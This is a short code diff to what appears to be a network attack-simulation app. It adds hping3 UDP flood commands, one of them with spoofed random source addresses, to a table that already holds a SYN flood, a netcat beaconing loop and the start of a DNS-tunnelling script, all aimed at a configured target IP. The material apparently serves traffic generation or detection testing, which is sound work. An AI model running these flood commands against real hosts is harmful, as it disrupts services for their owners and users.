@@ -252,6 +252,10 @@ function App() {
 
       SYN_FLOOD: `sudo hping3 -S -p 80 -c 500 -i u1000 ${config.target_ip}`,
 
+      UDP_FLOOD: `sudo hping3 --udp -p 53 -c 500 -i u1000 ${config.target_ip}`,
+
+      DISTRIBUTED_UDP_FLOOD: `sudo hping3 --udp --rand-source -p 53 -c 500 -i u2000 ${config.target_ip}`,
+
       C2_BEACONING: `for i in {1..5}; do nc -zvw 2 ${config.target_ip} 8080; sleep 5; done`,
 
       DGA_DNS_TUNNELLING: `sudo python3 - <<'PY'
